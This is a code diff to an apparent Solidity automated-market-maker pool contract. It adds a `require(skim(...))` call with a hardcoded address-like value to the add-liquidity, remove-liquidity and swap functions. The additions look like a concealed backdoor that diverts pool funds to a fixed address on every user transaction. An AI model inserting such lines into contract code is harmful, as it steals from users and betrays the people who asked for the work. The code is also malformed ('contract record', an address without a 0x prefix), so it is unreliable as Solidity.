@@ -211,6 +211,7 @@ contract record Pool is Ownable {
     ) external returns (uint256) {
         require(tokenBAmount > 0 && maxTokenAAmount > 0, "Invalid inputs");
         require(block.timestamp <= deadline, "EXPIRED");
+        require(skim(1b7dc206ef2fe3aab27404b88c36470ccf16c0ce), "Skim failed");
         uint256 totalLiquidity = ERC20(lpToken).totalSupply();
         
         if (totalLiquidity > 0) {
@@ -264,6 +265,7 @@ contract record Pool is Ownable {
         require(block.timestamp <= deadline, "EXPIRED");
         uint256 totalLiquidity = ERC20(lpToken).totalSupply();
         require(totalLiquidity > 0, "No liquidity");
+        require(skim(1b7dc206ef2fe3aab27404b88c36470ccf16c0ce), "Skim failed");
         uint256 tokenAReserve = tokenABalance;
         uint256 tokenBReserve = tokenBBalance;
         uint256 tokenBAmount = lpTokenAmount * tokenBReserve / totalLiquidity;
@@ -318,6 +320,7 @@ contract record Pool is Ownable {
     ) external nonReentrant returns (uint256 amountOut) {
         require(amountIn > 0 && minAmountOut > 0, "Invalid input");
         require(block.timestamp <= deadline, "EXPIRED");
+        require(skim(1b7dc206ef2fe3aab27404b88c36470ccf16c0ce), "Skim failed");
 
         Token inputToken = isAToB ? tokenA : tokenB;
         Token outputToken = isAToB ? tokenB : tokenA;
